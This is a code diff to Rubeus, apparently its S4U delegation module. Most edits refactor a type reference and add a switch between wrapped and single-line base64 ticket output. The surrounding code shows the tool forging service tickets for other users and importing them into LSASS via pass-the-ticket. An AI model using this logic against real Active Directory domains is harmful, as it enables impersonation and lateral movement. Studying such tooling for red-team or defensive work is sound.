@@ -2,6 +2,8 @@
 using System.IO;
 using System.Linq;
 using Asn1;
+using Rubeus.lib.Interop;
+
 
 namespace Rubeus
 {
@@ -10,7 +12,7 @@ namespace Rubeus
         public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "")
         {
             // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new Interop.LUID());
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID());
 
             if (kirbiBytes == null)
             {
@@ -201,10 +203,17 @@ namespace Rubeus
 
                         Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}/{1}':\r\n", altSname, serverName);
 
-                        // display the .kirbi base64, columns of 80 chararacters
-                        foreach (string line in Helpers.Split(kirbiString, 80))
+                        if (Rubeus.Program.wrapTickets)
                         {
-                            Console.WriteLine("      {0}", line);
+                            // display the .kirbi base64, columns of 80 chararacters
+                            foreach (string line in Helpers.Split(kirbiString, 80))
+                            {
+                                Console.WriteLine("      {0}", line);
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("      {0}", kirbiString);
                         }
 
                         if (!String.IsNullOrEmpty(outfile))
@@ -220,7 +229,7 @@ namespace Rubeus
                         if (ptt)
                         {
                             // pass-the-ticket -> import into LSASS
-                            LSA.ImportTicket(kirbiBytes, new Interop.LUID());
+                            LSA.ImportTicket(kirbiBytes, new LUID());
                         }
                     }
                 }
@@ -283,10 +292,17 @@ namespace Rubeus
 
                     Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);
 
-                    // display the .kirbi base64, columns of 80 chararacters
-                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    if (Rubeus.Program.wrapTickets)
                     {
-                        Console.WriteLine("      {0}", line);
+                        // display the .kirbi base64, columns of 80 chararacters
+                        foreach (string line in Helpers.Split(kirbiString, 80))
+                        {
+                            Console.WriteLine("      {0}", line);
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("      {0}", kirbiString);
                     }
 
                     if (!String.IsNullOrEmpty(outfile))
@@ -302,7 +318,7 @@ namespace Rubeus
                     if (ptt)
                     {
                         // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes, new Interop.LUID());
+                        LSA.ImportTicket(kirbiBytes, new LUID());
                     }
                 }
             }
@@ -410,11 +426,19 @@ namespace Rubeus
                 Console.WriteLine("[*] Got a TGS for '{0}' to '{1}@{2}'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
                 Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
 
-                // display the .kirbi base64, columns of 80 chararacters
-                foreach (string line in Helpers.Split(kirbiString, 80))
+                if (Rubeus.Program.wrapTickets)
                 {
-                    Console.WriteLine("      {0}", line);
+                    // display the .kirbi base64, columns of 80 chararacters
+                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    {
+                        Console.WriteLine("      {0}", line);
+                    }
                 }
+                else
+                {
+                    Console.WriteLine("      {0}", kirbiString);
+                }
+
                 Console.WriteLine("");
 
                 if (!String.IsNullOrEmpty(outfile))
@@ -808,16 +832,24 @@ namespace Rubeus
 
                 Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);
 
-                // display the .kirbi base64, columns of 80 chararacters
-                foreach (string line in Helpers.Split(kirbiString, 80))
+                if (Rubeus.Program.wrapTickets)
                 {
-                    Console.WriteLine("      {0}", line);
+                    // display the .kirbi base64, columns of 80 chararacters
+                    foreach (string line in Helpers.Split(kirbiString, 80))
+                    {
+                        Console.WriteLine("      {0}", line);
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("      {0}", kirbiString);
                 }
                 Console.WriteLine("");
+
                 if (ptt && cross)
                 {
                     // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new Interop.LUID());
+                    LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
@@ -845,10 +877,17 @@ namespace Rubeus
 
             Console.WriteLine("[*] {0}:\r\n", message);
 
-            // display the .kirbi base64, columns of 80 chararacters
-            foreach (string line in Helpers.Split(kirbiString, 80))
+            if (Rubeus.Program.wrapTickets)
             {
-                Console.WriteLine("      {0}", line);
+                // display the .kirbi base64, columns of 80 chararacters
+                foreach (string line in Helpers.Split(kirbiString, 80))
+                {
+                    Console.WriteLine("      {0}", line);
+                }
+            }
+            else
+            {
+                Console.WriteLine("      {0}", kirbiString);
             }
             Console.WriteLine("");
         }
